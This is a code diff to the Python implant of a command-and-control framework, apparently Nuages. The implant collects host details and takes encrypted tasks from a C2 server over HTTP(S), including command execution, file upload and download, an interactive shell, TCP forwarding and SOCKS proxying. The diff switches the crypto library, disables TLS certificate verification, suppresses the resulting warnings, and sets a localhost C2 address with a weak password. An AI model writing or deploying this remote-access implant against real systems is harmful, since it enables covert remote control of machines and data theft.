@@ -2,8 +2,8 @@ import hashlib
 import requests
 import platform
 import subprocess
-from Crypto import Random
-from Crypto.Cipher import AES
+from Cryptodome import Random
+from Cryptodome.Cipher import AES
 import binascii
 import json
 import io
@@ -14,11 +14,14 @@ import socket
 import sys
 import time
 import sys
+import warnings
+import urllib3
 from subprocess import PIPE, Popen
 from threading  import Thread
 import time
 from queue import Queue, Empty
 
+warnings.filterwarnings("ignore", category=urllib3.exceptions.InsecureRequestWarning)
 def enqueue_output(proc, queue):
     while(proc.poll() == None):
         queue.put(proc.stdout.read(1))
@@ -88,7 +91,7 @@ class NuagesConnector:
         encrypted_url = base64.b64encode(self.aes.encrypt(bytes(url, 'utf-8')))
         headers = {'Authorization': encrypted_url}
 
-        r = requests.post(self.connectionString, encrypted_data, headers=headers)
+        r = requests.post(self.connectionString, encrypted_data, headers=headers, verify=False)
         if(r.status_code != 200):
             raise Exception(r.status_code)            
         if(len(r.content)>0):
@@ -108,7 +111,7 @@ class NuagesConnector:
         
         headers = {'Authorization': encrypted_url}
 
-        r = requests.post(self.connectionString, encrypted_data, headers=headers)
+        r = requests.post(self.connectionString, encrypted_data, headers=headers, verify=False)
         if(r.status_code != 200):
             raise Exception(r.status_code)            
         if(len(r.content)>0):
@@ -128,7 +131,7 @@ class NuagesConnector:
         
         headers = {'Authorization': encrypted_url}
 
-        r = requests.post(self.connectionString, encrypted_data, headers=headers)
+        r = requests.post(self.connectionString, encrypted_data, headers=headers, verify=False)
         if(r.status_code != 200):
             raise Exception(r.status_code)            
         if(len(r.content)>0):
@@ -153,7 +156,7 @@ class NuagesImplant:
             self.username = os.getenv("LOGNAME")
         self.hostname = socket.gethostname()
         self.ip = socket.gethostbyname(self.hostname)
-        self.handler = "HTTPAES256"
+        self.handler = "HTTPS"
         self.implantType = "Python"
         self.connectionString = self.nuages.connectionString
         self.supportedPayloads = ["cd", "command", "configure", "upload", "download", "interactive", "tcp_fwd", "socks", "exit"]
@@ -636,7 +639,7 @@ class NuagesImplant:
                 else:
                     pass
                 
-nuages = NuagesConnector("http://127.0.0.1:8888","password")
+nuages = NuagesConnector("https://127.0.0.1","123456")
 config = {}
 config["sleep"] = "1"
 config["buffersize"] = "65536"
